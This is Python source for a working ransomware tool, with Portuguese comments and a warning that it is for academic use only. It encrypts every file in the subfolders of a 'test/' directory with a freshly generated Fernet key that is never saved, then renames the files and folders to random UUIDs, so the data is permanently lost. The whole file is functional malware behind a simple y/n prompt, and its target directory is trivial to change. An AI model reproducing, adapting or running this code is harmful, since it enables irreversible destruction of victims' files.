from cryptography.fernet import Fernet
from pathlib import Path
import sys
import uuid
import os
import art


class SimpleRansomware:
    """
        - Modelo basico de ransomware destinado apenas para fins academicos
        - Tome cuidado ao executa-lo pois mesmo não salva a chave sendo impossivel recuperar os arquivos
        - Pastas e arquivos seram renomeados junto com suas extenções
    """
    def __init__(self):
        self.folder = ''
        self.path = None
        self.key = Fernet.generate_key()

    def wellcome(self):
        """ Menu inicial """
        art.tprint(f'{" " * 16} Simple {" " * 16}', "tarty6")
        art.tprint('Ransomware', 'tarty6')

        print(f"{'_' * 13} Ferramenta destinada apenas para fims academicos! {'_' * 13}\n")
        print("Cuidado:\n"
              "Essa ferramneta não salva a chave para recuperar os arquivos, "
              "os danos causados por ela são sua responsabilidade")
        option = input("Deseja executar essa ferramenta no seu sistema?(y/n)").lower()
        if option == 'y':
            self.start()
        else:
            sys.exit()

    def start(self):
        """ Inicia o ataque """
        folders = self.check_folders()

        for folder in folders:
            self.folder = folder
            self.check_files_in_forlder(folder)

    def check_folders(self):
        """ Verifica as subpastas na pasta raiz indicada """
        folders = []
        self.path = Path('test/')

        for item in self.path.iterdir():
            if item.is_dir():
                folders.append(item)
        
        return folders

    def check_files_in_forlder(self, folder):
        """ Executa o ataque nos arquivos da pasta selecionada """
        files = os.listdir(folder)

        for item in files:
            self.encrypt_file(item)
            self.rename_file(item)

        self.rename_folder()

    def encrypt_file(self, filename):
        """ Criptografa o arquivo """
        with open(f"{self.folder}/{filename}", "rb") as file:
            file_data = file.read()

        f = Fernet(self.key)
        encrypted_data = f.encrypt(file_data)

        with open(f"{self.folder}/{filename}", "wb") as file:
            file.write(encrypted_data)

    def rename_file(self, item):
        """ Muda o nome do arquivo e a extensão para um valor aleatorio """
        filename = Path(f'{self.folder}/{item}')
        new_name = f"{uuid.uuid4()}{uuid.uuid4()}"
        suffix = str(new_name)[32:16].replace('-', 'x')

        filename.replace(f'{self.folder}/{new_name}.{suffix}')

    def rename_folder(self):
        """ Muda o nome da pasta para algo inlegivel """
        new_name = uuid.uuid4()
        self.folder.rename(f"{self.path}/{new_name}")

    @staticmethod
    def alert():
        print("\nPor questões de segurança esse script não pode ser executado atraves do menu!")
        print("Execute esse script de forma manual, mas antes verifue o script com cautela")


ransomware = SimpleRansomware()

if __name__ == '__main__':
    ransomware.wellcome()
